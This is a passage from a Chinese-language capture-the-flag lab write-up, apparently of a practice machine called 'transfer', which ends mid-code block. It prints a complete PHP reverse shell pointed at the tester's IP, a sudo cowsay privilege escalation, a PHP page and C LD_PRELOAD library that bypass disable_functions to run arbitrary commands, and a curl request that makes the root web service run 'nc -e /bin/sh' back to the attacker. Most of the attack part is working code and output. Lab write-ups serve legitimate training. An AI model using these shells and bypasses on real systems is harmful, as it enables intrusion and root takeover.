+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.159.174&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">4445</span>;</span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">	<span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">	<span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121708176.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121708178.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121708179.png" /></p>
+<p>反弹 shell 成功，获得 www-data 用户权限</p>
+<h3 id="提权">2.2. 提权</h3>
+<p><code>sudo -l</code> 得
+<code>(tom) NOPASSWD: /usr/games/cowsay</code></p>
+<p>尝试按 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/cowsay/">cowsay |
+GTFOBins</a> 提权未成功</p>
+<blockquote>
+<p>If the binary is allowed to run as superuser by <code>sudo</code>, it
+does not drop the elevated privileges and may be used to access the file
+system, escalate or maintain privileged access.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">sudo cowsay -f <span class="variable">$TF</span> x</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121717576.png" /></p>
+<p>未成功依旧是 <code>www-data</code> 用户</p>
+<p>上传 pspy64 执行发现服务端在 8888 也开了 web 服务，且是以 root
+权限运行的，但仅允许本地访问</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121723664.png" /></p>
+<p>为此可尝试基于该服务反弹个 root 权限的 shell</p>
+<p>经测当前用户有在 /dev/shm 下写入文件的权限，不过尝试用前面的
+re_shell.php 来反弹 shell 并未成功！反馈信息如下：</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121734225.png" /></p>
+<p>进一步查询得服务端的 php
+配置中禁用了相关函数【disable_functions】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121740907.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@transfer:/var/www/intranet$ php -i | grep -i disable_functions                                                                                    </span><br><span class="line">disable_functions =&gt; system,<span class="built_in">exec</span>,passthru,shell_exec,proc_open,proc_get_status,proc_terminate,proc_close,virtual,popen,show_source,curl_multi_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcnt =&gt; system,<span class="built_in">exec</span>,passthru,shell_exec,proc_open,proc_get_status,proc_terminate,proc_close,virtual,popen,show_source,curl_multi_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcnt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>disable_functions 绕过总结及分析</strong><br />
+- <a
+target="_blank" rel="noopener" href="https://www.meetsec.cn/index.php/archives/44/">绕过php的disable_functions（上篇）</a><br />
+- <a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/DumpInfou/p/18023278">绕过disable_functions的限制
+- DumpInfou - 博客园</a><br />
+- <a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#disablefunctions-rao-guo">PHP
+- Useful Functions &amp; disable_functions/open_basedir bypass | Chinese
+- Ht | HackTricks</a></p>
+</blockquote>
+<p>bypass_disable_func.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>bypass_disable_function.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so
+传递具体执行的命令行信息<br />
+用命令 gcc -shared -fPIC bypass_disable_function.c -o
+bypass_disable_func_x64.so 将 bypass_disable_function.c 编译为共享对象
+bypass_disable_func_x64.so：<br />
+要根据目标架构编译成不同版本，在 x64
+的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上
+-m32 选项。</p>
+</blockquote>
+<p>将 bypass_disable_func.php 和 bypass_disable_func_x64.so 上传至靶机的
+/dev/shm 目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@transfer:/dev/shm$ <span class="built_in">ls</span> -al                                                                                                                         </span><br><span class="line">total 20                                                                                                                                                   </span><br><span class="line">drwxrwxrwt  2 root     root        80 Sep 12 06:12 .                                                                                                       </span><br><span class="line">drwxr-xr-x 17 root     root      3120 Sep 11 10:06 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data   599 Sep 12 06:12 bypass_disable_func.php</span><br><span class="line">-rw-r--r--  1 www-data www-data 15568 Sep 12 06:10 bypass_disable_func_x64.so</span><br><span class="line">www-data@transfer:/dev/shm$ </span><br><span class="line">www-data@transfer:/dev/shm$ curl <span class="string">&quot;http://127.0.0.1:8888/bypass_disable_func.php?cmd=nc%20-e%20/bin/sh%20192.168.159.174%206666&amp;outpath=/tmp/pwd&amp;sopath=/dev/shm/bypass_disable_func_x64.so&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121757755.png" /></p>
+<p>成功获得 root 权限</p>
+<h2 id="复盘">3. 复盘</h2>
+<h3 id="定时任务">3.1. 定时任务</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line</span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run</span></span><br><span class="line"><span class="comment"># and what command to run for the task</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for</span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),</span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system</span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through</span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">@reboot /usr/bin/chmod 500 /var/www/html &amp;&amp; /usr/bin/chmod 777 /var/www/html/viewuploads &amp;&amp; /usr/bin/rm /var/www/html/viewuploads/*.php</span><br><span class="line">@reboot php -S 127.0.0.1:8888 -t /dev/shm</span><br></pre></td></tr></table></figure>
+<h3 id="tom-用户">3.2. tom 用户</h3>
+<p><code>sudo -l</code> 得
+<code>(tom) NOPASSWD: /usr/games/cowsay</code> ，提权操作 <a
+target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/cowsay/">cowsay |
+GTFOBins</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">sudo cowsay -f <span class="variable">$TF</span> x</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409121717576.png" /></p>
+<p>尝试提权未成功，经分析是权限不足导致的，因为 $TF 默认仅允许拥有者即
+www-data 用户读写，而提权时是基于 tom
+用户的，为此改下权限即可，操作如下【注意对比权限修改前后】：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line"><span class="built_in">chmod</span> +rw <span class="variable">$TF</span></span><br><span class="line">sudo cowsay -f <span class="variable">$TF</span> x</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 